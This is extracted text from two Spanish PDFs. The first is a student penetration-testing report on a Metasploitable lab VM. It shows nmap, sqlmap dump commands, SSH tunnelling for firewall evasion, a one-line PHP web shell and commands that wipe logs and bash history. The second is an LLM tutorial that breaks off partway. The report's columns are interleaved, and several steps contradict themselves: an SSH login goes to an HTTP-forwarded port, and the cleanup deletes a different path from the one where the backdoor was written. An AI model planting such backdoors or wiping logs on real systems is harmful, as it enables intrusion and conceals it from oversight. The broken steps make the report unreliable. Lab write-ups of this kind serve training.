@@ -1,0 +1,1173 @@
+### ETHPA.pdf ###
+Aplicación de Técnicas de Hacking Ético para la
+Evaluación y Mitigación de Vulnerabilidades en
+Metasploitable
+Miguel Murga Guevara
+Web Developer — Data Scientist
+BSG institute
+Email: miguelmurgaguevara@hotmail.com
+
+Abstract—Este proyecto aborda la evaluación y explotación de vulnerabilidades en sistemas virtualizados,
+utilizando técnicas avanzadas de hacking ético dentro de
+un entorno controlado. El objetivo principal fue identificar y explotar de manera segura las debilidades en la
+máquina virtual Metasploitable, una plataforma diseñada
+especı́ficamente para entrenar en seguridad informática.
+Mediante herramientas de análisis y penetración, como
+Metasploit y sqlmap, demostramos cómo se pueden descubrir y mitigar vulnerabilidades crı́ticas. Este enfoque no
+solo fortalece las habilidades en ciberseguridad, sino que
+también destaca la importancia de las pruebas de penetración continuas para mejorar la postura de seguridad
+de sistemas tecnológicos similares.
+
+•
+
+Documentar meticulosamente el proceso y los
+resultados de las pruebas de penetración para
+proporcionar un recurso educativo que demuestre prácticas efectivas de seguridad y
+técnicas de mitigación.
+III. D ESCRIPCI ÓN DEL C ASO
+
+En este proyecto, nuestro campo de pruebas es
+una máquina virtual conocida como Metasploitable,
+intencionalmente configurada con múltiples vulnerabilidades. Este entorno es ideal para educadores
+y estudiantes de ciberseguridad, proporcionando un
+escenario seguro donde se pueden explorar y exI. I NTRODUCCI ÓN
+plotar fallos de seguridad sin riesgos para sistemas
+El hacking ético es una disciplina fundamental reales. La exploración y el testeo se llevan a cabo
+en el campo de la seguridad informática, donde desde una Raspberry Pi 4 equipada con Kali Linux,
+los profesionales utilizan técnicas y herramientas de lo que demuestra la accesibilidad y la aplicabilidad
+penetración para identificar y remediar vulnerabili- de las pruebas de penetración utilizando hardware
+dades en sistemas y redes. Este proyecto se centra y software ampliamente disponibles y asequibles.
+en aplicar principios de hacking ético dentro de un
+IV. M ETODOLOG ÍA
+entorno controlado, utilizando máquinas virtuales
+diseñadas especı́ficamente para entrenamiento en A. Reconocimiento
+seguridad. Nuestro enfoque combina la teorı́a con
+Primero, usamos herramientas como Nmap para
+la práctica intensiva, permitiendo una comprensión ver qué hay en la red. Esto nos ayuda a encontrar
+profunda de cómo se pueden explotar las vulner- nuestra máquina objetivo y empezar a planear nueabilidades y, lo más importante, cómo se pueden stro ataque.
+mitigar.
+B. Escaneo
+II. O BJETIVOS DEL P ROYECTO
+El escaneo es una fase crı́tica que nos permite
+El objetivo de este proyecto es doble:
+descubrir los puertos abiertos y los servicios en
+• Evaluar y explotar sistemáticamente las vul- ejecución. Esta etapa es fundamental para inferir
+nerabilidades dentro de la máquina virtual el sistema operativo del objetivo y para identiMetasploitable, utilizando una variedad de her- ficar vulnerabilidades especı́ficas. Para llevar a cabo
+esta tarea, se utilizó la herramienta de escaneo de
+ramientas y técnicas de hacking ético.
+
+puertos Nmap y un análisis de vulnerabilidades
+con herramientas como Nessus o OpenVAS. Estos
+programas avanzados correlacionan los servicios
+descubiertos con una base de datos de vulnerabilidades conocidas y proporcionan una puntuación
+CVSS para cada hallazgo, facilitando la priorización
+basada en la severidad del riesgo.
+Se llevó a cabo un escaneo de puertos utilizando
+Nmap, que nos permitió identificar los siguientes
+servicios activos en la máquina objetivo:
+Listing 1. Resultado del escaneo de puertos con Nmap
+\begin{lstlisting}[language=bash, caption={
+,→ Resultado del escaneo Nmap}]
+nmap -p- 192.168.1.216
+Starting Nmap 7.94SVN ( https://nmap.org ) at
+,→ 2024-04-26 04:53 UTC
+Nmap scan report for 192.168.1.216
+Host is up (0.015s latency).
+Not shown: 65505 closed ports
+PORT
+STATE SERVICE
+21/tcp
+open ftp
+22/tcp
+open ssh
+23/tcp
+open telnet
+25/tcp
+open smtp
+53/tcp
+open domain
+80/tcp
+open http
+111/tcp open rpcbind
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+512/tcp open exec
+513/tcp open login
+514/tcp open shell
+1099/tcp open rmiregistry
+1524/tcp open ingreslock
+2049/tcp open nfs
+2121/tcp open ccproxy-ftp
+3306/tcp open mysql
+3632/tcp open distccd
+5432/tcp open postgresql
+5900/tcp open vnc
+6000/tcp open X11
+6667/tcp open irc
+6697/tcp open ircs-u
+8009/tcp open ajp13
+8180/tcp open unknown
+8787/tcp open msgsrvr
+
+Con la información recopilada, se procedió a
+evaluar las vulnerabilidades de los servicios identificados. La siguiente tabla presenta las vulnerabilidades crı́ticas encontradas junto con sus respectivas
+puntuaciones CVSS.
+Esta evaluación de vulnerabilidades proporciona
+una base sólida para la siguiente fase del proyecto,
+en la que se seleccionará y explotará una de estas
+
+Puerto
+21/tcp
+22/tcp
+80/tcp
+139/tcp
+445/tcp
+3306/tcp
+
+Servicio
+Vulnerabilidad
+CVSS
+ftp
+CVE-2007-2441 10.0
+ssh
+CVE-2008-0166 7.8
+http
+CVE-2017-5638 10.0
+netbios-ssn
+CVE-2008-4250 10.0
+microsoft-ds CVE-2008-4250 10.0
+mysql
+CVE-2012-2122 5.5
+TABLE I
+V ULNERABILIDADES Y PUNTUACIONES CVSS DE SERVICIOS
+IDENTIFICADOS .
+
+vulnerabilidades para obtener acceso al sistema objetivo.
+C. Obtención de Acceso
+Durante la fase de obtención de acceso, se utilizó
+el marco de trabajo Metasploit para evaluar la seguridad del sistema y ganar acceso no autorizado. Se
+ejecutaron módulos auxiliares para explorar posibles
+vulnerabilidades en el sistema.
+El
+primer
+módulo
+utilizado
+fue
+http/verb_auth_bypass, configurado para
+apuntar a la dirección IP de la máquina objetivo:
+Listing 2. Ejecución de módulo en Metasploit
+msf6 > use auxiliary/scanner/http/
+,→ verb_auth_bypass
+msf6 auxiliary(scanner/http/verb_auth_bypass)
+,→ > set RHOSTS 192.168.1.216
+msf6 auxiliary(scanner/http/verb_auth_bypass)
+,→ > run
+
+Este módulo se ejecutó contra el servidor web
+objetivo, indicando que ciertas áreas del sistema
+eran accesibles sin autenticación previa. Sin embargo, múltiples intentos de explotar vulnerabilidades especı́ficas fueron inicialmente bloqueados
+por el firewall de Windows 11, lo cual generó
+errores de conectividad y restricciones en el acceso.
+A pesar de reconocer las vulnerabilidades con
+herramientas como Nmap, intentar acceder a ellas resultó en errores causados por configuraciones
+del firewall. Este desafı́o nos llevó a implementar métodos de evasión detallados en la próxima
+sección, asegurando ası́ la continuidad del acceso
+y la evaluación de las vulnerabilidades.
+Aprovechando este acceso preliminar y tras ajustar las configuraciones del firewall, se empleó la
+herramienta sqlmap para realizar un análisis más
+profundo y explotar las vulnerabilidades de inyección SQL en el sitio web DVWA en la máquina
+Metasploitable:
+
+E. Recuperación de la Cookie de Sesión
+Tras necesitar recuperar la cookie de sesión para
+realizar ataques de inyección SQL autenticados en
+La herramienta sqlmap proporcionó técnicas para DVWA, se utilizó el comando ‘curl‘ para acceder al
+explotar la inyección SQL, incluyendo la obtención formulario de login y capturar la cookie PHPSESde una cookie de sesión del DVWA. Esta cookie SID a través del puerto tunelizado.
+fue posteriormente utilizada para mantener acceso
+Listing 7. Comando para capturar la cookie de sesión
+al sistema y facilitar la exploración de la base de
+curl -i -s "http://localhost:8081/dvwa/login.
+datos subyacente.
+,→ php"
+Con el acceso obtenido, el siguiente paso fue esLa cookie obtenida fue usada en sqlmap para
+tablecer una puerta trasera en el sistema, asegurando
+un acceso persistente para futuras pruebas y análisis explotar de manera efectiva las vulnerabilidades
+de seguridad, siempre siguiendo una metodologı́a de inyección SQL en el sistema, demostrando la
+importancia de proteger y monitorizar las sesiones
+ética y con el debido permiso.
+de usuarios en aplicaciones web.
+Listing 3. Obtención de cookie de sesión con sqlmap en DVWA
+sqlmap -u "http://192.168.1.216/dvwa/login.php
+,→ " --forms --risk=3 --level=5 --dump
+
+Listing 4. Establecimiento de túnel SSH utilizando un puerto
+alternativo
+ssh -L 8081:192.168.1.216:80 kali@192.168.1.92
+
+Este comando configura un túnel SSH que
+redirige el tráfico del puerto 80 en Metasploitable al
+puerto 8081 local en la Raspberry Pi, superando el
+problema del puerto 8080 que estaba previamente
+en uso, demostrando la flexibilidad en la elección
+de puertos para la evasión efectiva de firewall.
+D. Acceso y Explotación a Través del Túnel SSH
+Después de establecer con éxito un túnel SSH y
+confirmar su funcionalidad a través de un escaneo
+con nmap, se procedió a acceder al servicio en el
+puerto redirigido. El escaneo reveló que el puerto
+8081 estaba activo y listo para ser explorado.
+
+F. Análisis de Inyección SQL en DVWA
+El análisis de inyección SQL es crucial para evaluar la seguridad de las aplicaciones web. Utilizamos
+la herramienta sqlmap para explorar y explotar
+vulnerabilidades de inyección SQL en el formulario
+de login del DVWA, un componente accesible a
+través del túnel SSH previamente establecido.
+La ejecución inicial de sqlmap se configuró para
+probar todas las formas posibles de inyecciones
+SQL, ajustando el nivel de riesgo y profundidad del
+análisis para una cobertura exhaustiva:
+Listing 8. Proceso de prueba de inyección SQL con sqlmap
+sqlmap -u "http://localhost:8081/dvwa/login.
+,→ php" --cookie="PHPSESSID=177
+,→ c1ee1e5c55e5b6c5621802442406d; security=
+,→ high" --forms --risk=3 --level=5 --dump
+
+Inicialmente, las pruebas no indicaron vulnerabilidades evidentes, sugiriendo la implementación
+El servicio identificado estaba ejecutándose en el de robustas técnicas de sanitización por parte del
+puerto 8081 y fue accesible a través del navegador servidor. No obstante, continuamos con una serie
+en la dirección http://localhost:8081. Esto de pruebas avanzadas para sondear vulnerabilidades
+permitió una interacción directa con la aplicación o potencialmente ocultas o bien protegidas:
+servicio Metasploitable, facilitando la evaluación de
+Listing 9. Exploración inicial y pruebas booleanas en sqlmap
+seguridad y la realización de pruebas de penetración [INFO] testing for SQL injection on POST
+,→ parameter ’username’
+adicionales.
+Listing 5. Resultado del escaneo nmap a través del túnel SSH
+nmap -p 8081 localhost
+
+Listing 6. Acceso al servicio a través del navegador
+firefox http://localhost:8081
+
+[WARNING] heuristic (basic) test shows that
+,→ POST parameter ’username’ might not be
+,→ injectable
+[INFO] testing ’AND boolean-based blind ,→ WHERE or HAVING clause’
+
+Este método de acceso tunelizado demostró ser
+Este procedimiento demostró ser fundamental, ya
+efectivo para eludir restricciones de red y firewall,
+permitiendo una evaluación de seguridad más pro- que a pesar de las medidas de seguridad, se identificó que el parámetro ’username’ era susceptible
+funda y detallada del sistema objetivo.
+
+a inyecciones SQL de tipo booleano y basado en
+Después de configurar estos detalles, la conexión
+tiempo cuando se utilizaban consultas especialmente SSH a Metasploitable se realiza utilizando el siguformateadas (MySQL ¿ 5.0.12), lo que indica que iente comando, lo que refleja el uso del túnel para
+manipulaciones especı́ficas de la consulta podrı́an todas las operaciones:
+comprometer la base de datos:
+Listing 10. Descubrimiento de vulnerabilidades de inyección SQL
+[INFO] POST parameter ’username’ appears to be
+,→ ’MySQL > 5.0.12 OR time-based blind (
+,→ heavy query - comment)’ injectable
+
+Listing 13. Conexión SSH a Metasploitable a través del túnel
+ssh msfadmin@localhost -p 8001
+
+Esta configuración garantiza que todas las comunicaciones con Metasploitable sean seguras y pasen
+Estos hallazgos subrayan la importancia de re- a través del túnel establecido, proporcionando una
+alizar pruebas exhaustivas y especializadas para capa adicional de seguridad y cumpliendo con las
+cada parámetro susceptible dentro de aplicaciones necesidades de evasión del firewall.
+crı́ticas, asegurando que las defensas del servidor
+H. Mantenimiento de Acceso
+puedan resistir ataques sofisticados y dirigidos. Este
+Tras establecer una conexión segura con Metasenfoque no solo valida la efectividad de las medidas de seguridad implementadas, sino que también ploitable a través de un túnel SSH, procedimos a
+destaca áreas donde se requiere fortalecimiento adi- implementar un método para mantener el acceso al
+sistema de manera continua. Esto se logró mediante
+cional.
+la instalación de una puerta trasera en el servidor
+G. Configuración y Conexión SSH
+web del Metasploitable, permitiéndonos ejecutar
+Para acceder a Metasploitable de forma segura y comandos de manera remota y mantener el control
+eludir las configuraciones de firewall de Windows sobre la máquina.
+11, se estableció un túnel SSH que redirige el puerto
+Listing 14. Creación de la puerta trasera en PHP
+8001 del host local al puerto 80 de la máquina
+echo "<?php if(isset(\$_GET[’cmd’])) { system
+Metasploitable. Este método nos permite utilizar
+,→ (\$_GET[’cmd’]); } ?>" | sudo tee /var/
+el host local como un punto intermedio para las
+,→ www/html/dvwa/vulnerable.php
+conexiones SSH, asegurando que todas las comuEl archivo ‘vulnerable.php‘ se creó en el directonicaciones pasen a través de un canal cifrado.
+rio web de DVWA, ubicado en el servidor MetasListing 11. Establecimiento del túnel SSH
+ploitable. Este script PHP es simple pero efectivo,
+ssh -L 8001:192.168.1.216:80 kali@192.168.1.92
+permitiendo la ejecución de comandos arbitrarios
+Este comando configura el túnel SSH de tal pasados a través de la URL. Utilizamos el túnel
+manera que cualquier acceso al puerto 8001 en SSH para probar la puerta trasera de manera segura
+el host local se reenvı́a automáticamente al puerto y sin exponer nuestras acciones a través de la red
+80 en Metasploitable. Después de establecer este externa.
+túnel, todas las interacciones con servicios web
+Listing 15. Prueba de la puerta trasera a través del túnel SSH
+en Metasploitable pueden realizarse a través de la
+curl "http://localhost:8001/dvwa/vulnerable.
+dirección ‘http://localhost:8001/‘.
+,→ php?cmd=whoami"
+Para asegurar conexiones SSH adicionales direcLa respuesta fue ‘www-data‘, que es el usuario
+tamente a través de este túnel para la administración
+bajo
+el cual se ejecuta el servidor web Apache en
+del sistema, ajustamos la configuración del cliente
+SSH para aceptar los algoritmos de clave ofrecidos Metasploitable. Esto confirma que la puerta trasera
+por el servidor, utilizando ‘localhost‘ y el puerto está operativa y que podemos ejecutar comandos en
+el servidor a través de ella utilizando el puerto tuneltunelizado.
+izado. Este acceso persistente nos permite realizar
+Listing 12. Configuración del cliente SSH para conexiones a través
+pruebas adicionales y monitorear la seguridad del
+del túnel
+Host localhost
+sistema de manera continua, todo mientras mantenPort 8001
+emos la actividad oculta del firewall de Windows
+HostKeyAlgorithms +ssh-rsa,ssh-dss
+11.
+PubkeyAcceptedKeyTypes +ssh-rsa,ssh-dss
+
+I. Borrado de Huellas
+El proceso de borrado de huellas es esencial
+para minimizar el riesgo de detección post-intrusión
+y para adherirnos a prácticas éticas en pruebas
+de penetración. Se tomaron varias medidas para
+asegurar que nuestras actividades dejaran el menor
+rastro posible en el sistema.
+Primero, se limpiaron los logs de Apache y de
+autenticación para eliminar cualquier registro de las
+actividades realizadas durante la sesión.
+Listing 16. Limpieza de logs de Apache
+echo "" | sudo tee /var/log/apache2/access.log
+echo "" | sudo tee /var/log/apache2/error.log
+
+Listing 17. Limpieza de logs de autenticación
+echo "" | sudo tee /var/log/auth.log
+
+Además, se eliminó el historial de comandos de
+la sesión para evitar que futuras auditorı́as pudieran
+rastrear los comandos utilizados.
+Listing 18. Limpieza del historial de Bash
+history -c && history -w
+
+Por último, se eliminaron todos los archivos temporales y scripts de puerta trasera que se habı́an utilizado para asegurar el acceso o ejecutar comandos
+en el sistema.
+Listing 19. Eliminación de archivos temporales
+sudo rm /var/www/vulnerable.php
+
+V. R ESULTADOS Y A N ÁLISIS
+Durante este proyecto, logramos identificar y explotar múltiples vulnerabilidades en la máquina virtual Metasploitable. Las herramientas como Nmap
+y sqlmap fueron fundamentales para descubrir servicios vulnerables y realizar ataques de inyección
+SQL efectivos. A través del túnel SSH, pudimos
+evadir el firewall de Windows 11 y acceder a
+Metasploitable de manera segura y discreta.
+A través de nuestras pruebas, instalamos una
+puerta trasera en el servidor web de Metasploitable
+que nos permitió ejecutar comandos de sistema de
+manera remota. Confirmamos la funcionalidad de
+esta puerta trasera utilizando el comando curl, que
+nos permitió ejecutar comandos directamente en el
+servidor y obtener respuestas como la identidad del
+usuario del servidor web, ‘www-data‘.
+
+Listing 20. Ejemplo de comando ejecutado a través de la puerta
+trasera
+curl "http://localhost:8001/dvwa/vulnerable.
+,→ php?cmd=whoami"
+
+Además, los registros del servidor y las capturas
+de pantalla (no incluidas aquı́ por razones de espacio
+y formato) corroboran nuestras actividades en el
+servidor y destacan la efectividad de las técnicas
+empleadas.
+VI. C ONCLUSIONES Y R ECOMENDACIONES
+El proyecto culminó con éxito en la demostración
+de cómo las vulnerabilidades conocidas en aplicaciones como DVWA pueden ser explotadas y
+cómo se pueden emplear técnicas de evasión como
+los túneles SSH para superar barreras como los
+firewalls. Este ejercicio nos ha proporcionado una
+valiosa experiencia práctica en la identificación,
+explotación y mantenimiento del acceso en entornos
+controlados.
+De nuestras experiencias, recomendamos lo siguiente para mejorar la seguridad de sistemas similares
+a Metasploitable:
+• Regularmente actualizar y parchear los sistemas para protegerse contra vulnerabilidades
+conocidas.
+• Implementar polı́ticas estrictas de firewall
+y monitorear activamente los registros para
+cualquier actividad sospechosa.
+• Educar a los administradores del sistema y a
+los usuarios sobre las técnicas de seguridad
+y las mejores prácticas para la defensa en
+profundidad.
+• Realizar auditorı́as de seguridad y pruebas
+de penetración periódicas por parte de profesionales cualificados para identificar y mitigar
+vulnerabilidades antes de que puedan ser explotadas.
+Además, este proyecto subraya la importancia de
+considerar la seguridad desde el diseño inicial y
+mantener una actitud proactiva hacia la gestión de
+la seguridad, no solo reactiva ante incidentes.
+En conclusión, aunque hemos logrado acceso y
+explotación exitosa en un entorno controlado, es
+crucial entender que el objetivo final es fortalecer
+nuestras defensas y asegurar nuestros sistemas de
+manera más efectiva.
+
+### IA_Generativa__Particularidades_de_los_Modelos_de_Lenguaje_Grandes.pdf ###
+IA Generativa: Particularidades de los
+Modelos de Lenguaje Grandes
+Miguel Murga Guevara
+miguelmurgaguevara@hotmail.com
+March 12, 2025
+Abstract
+Este documento proporciona una introducción estructurada a los
+fundamentos de la inteligencia artificial, comenzando desde la ciencia
+de datos y avanzando hacia las redes neuronales y los Transformers. Se abordan en detalle el mecanismo de atención, la codificación
+posicional y sus ventajas sobre arquitecturas previas como las Redes
+Neuronales Recurrentes (RNNs), estableciendo una base sólida para
+comprender los Modelos de Lenguaje Grandes (LLMs) en el contexto
+de la IA Generativa. Asimismo, se exploran conceptos avanzados como
+tokens, embeddings y técnicas de optimización que permiten a estos
+modelos manejar tareas complejas en el procesamiento del lenguaje
+natural (NLP). Finalmente, se propone una práctica en Meta AI para
+experimentar con las capacidades y limitaciones de los LLMs, facilitando la comprensión aplicada de sus potencialidades y desafı́os en el
+procesamiento y generación de lenguaje.
+
+Contents
+Contents
+
+1
+
+1 Introducción
+
+3
+
+2 Objetivos
+
+3
+1
+
+3 Fundamentos de la Ciencia de Datos y la Inteligencia Artificial
+4
+3.1 Redes Neuronales y Compuertas Lógicas . . . . . . . . . . . . 4
+3.1.1 Modelo de la Neurona Artificial . . . . . . . . . . . . . 4
+3.1.2 Emulación de Compuertas Lógicas . . . . . . . . . . . 5
+3.1.3 Limitaciones y Redes Neuronales Complejas . . . . . . 5
+3.2 Procesamiento de Secuencias y Limitaciones de las RNN . . . 5
+3.2.1 Funcionamiento de las RNN . . . . . . . . . . . . . . . 5
+3.3 El Mecanismo de Atención en Transformers . . . . . . . . . . 6
+3.3.1 Vectores Query (Q), Key (K) y Value (V) . . . . . . . 6
+3.3.2 Mecanismo de Atención Escalada (Scaled Dot-Product
+Attention) . . . . . . . . . . . . . . . . . . . . . . . . . 6
+3.3.3 Atención Multicabeza (Multi-Head Attention) . . . . . 6
+4 Modelos de Lenguaje Grandes
+4.1 Introducción a los Tokens . . . . . . . . . . . . . . . . . . . .
+4.1.1 Ejemplo de Tokenización y Análisis Semántico . . . . .
+4.2 Introducción a los Embeddings . . . . . . . . . . . . . . . . .
+4.2.1 Importancia de los Embeddings . . . . . . . . . . . . .
+4.2.2 Proceso de Generación de Embeddings . . . . . . . . .
+4.3 Conversión Inicial de la Secuencia . . . . . . . . . . . . . . . .
+4.4 Codificación Posicional . . . . . . . . . . . . . . . . . . . . . .
+4.4.1 Necesidad de la Codificación Posicional . . . . . . . . .
+4.4.2 Primeros Intentos de Codificación . . . . . . . . . . . .
+4.4.3 Codificación Posicional mediante Codificación Binaria .
+4.4.4 De la Codificación Binaria a las Funciones Sinusoidales
+4.4.5 Codificación Posicional Sinusoidal . . . . . . . . . . . .
+4.4.6 Intuición Detrás de las Codificaciones Sinusoidales . . .
+4.4.7 Ventajas de las Codificaciones Sinusoidales . . . . . . .
+4.4.8 Implementación en el Modelo . . . . . . . . . . . . . .
+4.4.9 Visualización de las Codificaciones Posicionales . . . .
+4.4.10 Importancia en el Transformer . . . . . . . . . . . . . .
+4.5 Ventajas de los Transformers sobre las RNNs . . . . . . . . . .
+4.6 Resumen . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+6
+7
+7
+8
+8
+9
+9
+9
+10
+10
+10
+11
+12
+12
+13
+13
+14
+15
+16
+16
+
+5 Práctica: Uso de Modelos de Lenguaje Grandes en Meta AI 16
+6 Conclusiones
+
+20
+2
+
+References
+
+1
+
+22
+
+Introducción
+
+La inteligencia artificial (IA) ha experimentado un crecimiento exponencial
+en las últimas décadas, influenciando diversos campos y revolucionando la
+forma en que interactuamos con la tecnologı́a. Para comprender plenamente
+el alcance y las capacidades de la IA moderna, es fundamental comenzar por
+la ciencia de datos, disciplina que permite extraer conocimiento y patrones
+significativos a partir de grandes volúmenes de datos.
+Este documento explora los cimientos de la IA, comenzando con los conceptos básicos de la ciencia de datos, avanzando hacia las redes neuronales y
+culminando en el mecanismo de atención en Transformers. Esta progresión
+conceptual es esencial para entender las particularidades y el funcionamiento
+de los Modelos de Lenguaje Grandes (LLM), que serán abordados en detalle
+en secciones posteriores.
+
+2
+
+Objetivos
+
+El objetivo principal de este trabajo es proporcionar una comprensión clara
+y estructurada de los fundamentos que sustentan la inteligencia artificial
+y cómo estos conducen al desarrollo de los Modelos de Lenguaje Grandes.
+Especı́ficamente, se busca:
+• Introducir los conceptos básicos de la ciencia de datos y su relevancia
+en la IA.
+• Explicar el funcionamiento de las redes neuronales y su papel en el
+reconocimiento de patrones complejos.
+• Describir el mecanismo de atención en Transformers y su importancia
+en el procesamiento de secuencias.
+• Preparar el terreno para una discusión detallada sobre los Modelos de
+Lenguaje Grandes en la sección 4.
+• Proponer una práctica para experimentar con un modelo de lenguaje
+en LM Studio.
+3
+
+3
+
+Fundamentos de la Ciencia de Datos y la
+Inteligencia Artificial
+
+La ciencia de datos es una disciplina que combina técnicas de estadı́stica,
+matemáticas y computación para analizar e interpretar datos. En el contexto
+de la inteligencia artificial, la ciencia de datos proporciona las herramientas
+necesarias para procesar y extraer información útil de grandes conjuntos de
+datos, lo que es fundamental para entrenar modelos inteligentes.
+
+3.1
+
+Redes Neuronales y Compuertas Lógicas
+
+Las redes neuronales artificiales son modelos computacionales inspirados en
+el funcionamiento del cerebro humano. Están compuestas por unidades interconectadas llamadas neuronas artificiales, que procesan información y aprenden a reconocer patrones complejos.
+3.1.1
+
+Modelo de la Neurona Artificial
+
+Una neurona artificial realiza una combinación lineal de sus entradas y aplica
+una función de activación para generar una salida. Matemáticamente, se
+representa como:
+!
+n
+X
+Salida = ϕ
+w i xi + b
+i=1
+
+Donde:
+• xi son las entradas.
+• wi son los pesos asociados a cada entrada.
+• b es el sesgo (bias).
+• ϕ es la función de activación.
+Este modelo básico permite emular operaciones lógicas fundamentales y
+sirve como bloque de construcción para redes más complejas.
+
+4
+
+3.1.2
+
+Emulación de Compuertas Lógicas
+
+Ajustando los pesos y el sesgo, una neurona artificial puede emular compuertas lógicas como AND, OR y NOT. Por ejemplo, para emular una compuerta
+AND:
+• Pesos: w1 = 1, w2 = 1
+• Sesgo: b = −1.5
+• Función de activación: Función escalón
+El comportamiento de la neurona replicará la tabla de verdad de la compuerta AND, demostrando cómo las redes neuronales pueden realizar operaciones lógicas básicas.
+3.1.3
+
+Limitaciones y Redes Neuronales Complejas
+
+Mientras que neuronas individuales pueden emular funciones linealmente separables, para funciones más complejas como XOR es necesario utilizar redes
+neuronales multicapa. Estas redes pueden aprender representaciones más
+abstractas y resolver problemas no lineales.
+
+3.2
+
+Procesamiento de Secuencias y Limitaciones de las
+RNN
+
+Las Redes Neuronales Recurrentes (RNN, Recurrent Neural Networks) están
+diseñadas para procesar datos secuenciales, manteniendo información de estados anteriores. Sin embargo, tienen dificultades para capturar dependencias
+a largo plazo debido al problema del desvanecimiento del gradiente.
+3.2.1
+
+Funcionamiento de las RNN
+
+Las RNN procesan secuencias de forma iterativa, actualizando su estado
+interno en cada paso. A pesar de su capacidad para manejar secuencias, su
+rendimiento disminuye cuando la dependencia entre elementos de la secuencia
+es muy extensa.
+
+5
+
+3.3
+
+El Mecanismo de Atención en Transformers
+
+Los Transformers introducen el mecanismo de atención, permitiendo capturar
+relaciones globales en la secuencia sin procesarla de forma secuencial.
+3.3.1
+
+Vectores Query (Q), Key (K) y Value (V)
+
+Cada elemento de la secuencia se representa mediante tres vectores:
+• Query (Q): La consulta que busca información relevante.
+• Key (K): La clave que identifica la información en otros elementos.
+• Value (V): El contenido que se utiliza para generar la salida.
+Estos vectores permiten calcular la atención que un elemento debe prestar
+a otros en la secuencia.
+3.3.2
+
+Mecanismo de Atención Escalada (Scaled Dot-Product Attention)
+
+El cálculo de atención se realiza mediante:
+
+
+QK ⊤
+V
+Atención = softmax √
+dk
+Este mecanismo permite al modelo enfocarse en las partes relevantes de
+la secuencia para cada paso de procesamiento.
+3.3.3
+
+Atención Multicabeza (Multi-Head Attention)
+
+La atención multicabeza mejora la capacidad del modelo para capturar diferentes tipos de relaciones en la secuencia, procesando múltiples atenciones en
+paralelo.
+
+4
+
+Modelos de Lenguaje Grandes
+
+Los Modelos de Lenguaje Grandes (LLMs, Large Language Models) han revolucionado el campo del procesamiento del lenguaje natural (NLP, Natural
+Language Processing), permitiendo que las máquinas comprendan y generen
+6
+
+texto con un nivel de coherencia y fluidez sin precedentes. Para entender
+cómo funcionan estos modelos, es esencial conocer conceptos clave como tokens, embeddings, codificación posicional y técnicas avanzadas como RAG y
+PEFT.
+
+4.1
+
+Introducción a los Tokens
+
+Los tokens son las unidades básicas en las que se divide el texto para su
+procesamiento por parte de los modelos de lenguaje. No son necesariamente
+palabras completas; pueden ser caracteres, subpalabras o sı́mbolos especiales.
+La tokenización es el proceso de convertir una secuencia de texto en una lista
+de tokens.
+4.1.1
+
+Ejemplo de Tokenización y Análisis Semántico
+
+Consideremos un ejemplo utilizando un modelo de lenguaje en inglés. Supongamos que tenemos una lista de preguntas:
+• ”What is the capital of France?”
+• ”What is the smallest state in India?”
+• ”What is the smallest state in the US?”
+• ”What is the longest river in the world?”
+• ”What is the highest mountain in Africa?”
+Cada pregunta se tokeniza y se convierte en una representación vectorial mediante embeddings. En una visualización denominada Output Vector
+Projection, se muestran las relaciones entre las preguntas en un espacio bidimensional.
+
+7
+
+Figure 1: Proyección de vectores de salida mostrando la agrupación semántica
+de las preguntas.
+En la visualización, los números dentro de cı́rculos representan las distintas preguntas, donde cada número corresponde a una pregunta especı́fica de
+la lista. Por ejemplo, el número ”13” está vinculado a la pregunta ”What is
+the smallest state in the US?”. La proyección agrupa visualmente preguntas similares basándose en relaciones semánticas, una aproximación común
+en el procesamiento del lenguaje natural para agrupar entradas según su
+significado subyacente.
+La proximidad de los números en la proyección indica la similitud semántica
+entre las preguntas. Por ejemplo, las preguntas sobre el estado más pequeño
+en diferentes paı́ses se agrupan juntas, reflejando que el modelo ha capturado
+su similitud en contenido.
+
+4.2
+
+Introducción a los Embeddings
+
+Los embeddings son representaciones numéricas de los tokens en espacios vectoriales de alta dimensión. Transforman los tokens, que son entidades discretas, en vectores continuos que capturan información semántica y
+sintáctica.
+4.2.1
+
+Importancia de los Embeddings
+
+Los embeddings permiten que los modelos:
+• Capturen similitudes entre palabras y frases: Palabras o frases
+con significados similares tendrán vectores cercanos en el espacio de
+8
+
+embeddings.
+• Manejen relaciones complejas: Capturan relaciones semánticas y
+sintácticas, permitiendo al modelo entender contextos y significados
+más profundos.
+• Visualicen y agrupen datos: Facilitan la representación gráfica de
+datos para análisis y comprensión, como en la Figura 1.
+4.2.2
+
+Proceso de Generación de Embeddings
+
+Cada token obtenido tras la tokenización se transforma en un vector de dimensión fija mediante una capa de embeddings. Estos vectores son entrenables y se ajustan durante el entrenamiento del modelo para optimizar su
+rendimiento en tareas especı́ficas.
+
+4.3
+
+Conversión Inicial de la Secuencia
+
+Con la comprensión de tokens y embeddings, podemos describir el proceso
+inicial que sigue un LLM al recibir texto de entrada:
+1. Tokenización: El texto se divide en tokens utilizando un método adecuado (por ejemplo, Byte Pair Encoding o WordPiece).
+2. Generación de Embeddings: Cada token se transforma en un vector
+numérico mediante la capa de embeddings.
+3. Codificación Posicional: Se suman los embeddings con vectores posicionales para incorporar información sobre la posición de cada token
+en la secuencia.
+
+4.4
+
+Codificación Posicional
+
+Los Transformers procesan las secuencias de entrada de manera no secuencial,
+es decir, consideran todos los tokens simultáneamente. Esto plantea el desafı́o
+de cómo mantener la información sobre el orden de los tokens, que es crucial
+para entender el contexto y el significado en el lenguaje natural.
+
+9
+
+4.4.1
+
+Necesidad de la Codificación Posicional
+
+A diferencia de las redes neuronales recurrentes (RNNs), que procesan secuencias de manera secuencial y, por tanto, tienen incorporada la información de orden, los Transformers requieren un mecanismo para representar
+la posición de cada token. Sin información posicional, el modelo no podrı́a
+distinguir entre diferentes permutaciones de los mismos tokens, lo que afectarı́a su capacidad para entender y generar lenguaje coherente.
+4.4.2
+
+Primeros Intentos de Codificación
+
+Una idea inicial podrı́a ser asignar un número absoluto a cada posición, por
+ejemplo, 1 para el primer token, 2 para el segundo, y ası́ sucesivamente. Cada
+posición tendrı́a asociado un vector donde todas sus componentes son iguales
+al número de posición. Sin embargo, esto presenta problemas:
+• Valores Elevados: En secuencias largas, los valores numéricos pueden
+volverse muy grandes, lo que puede afectar negativamente al aprendizaje del modelo, ya que los embeddings posicionales podrı́an dominar
+a los embeddings de los tokens.
+• Generalización Limitada: Modelos entrenados en secuencias de longitud fija podrı́an no generalizar bien a secuencias más largas o más
+cortas.
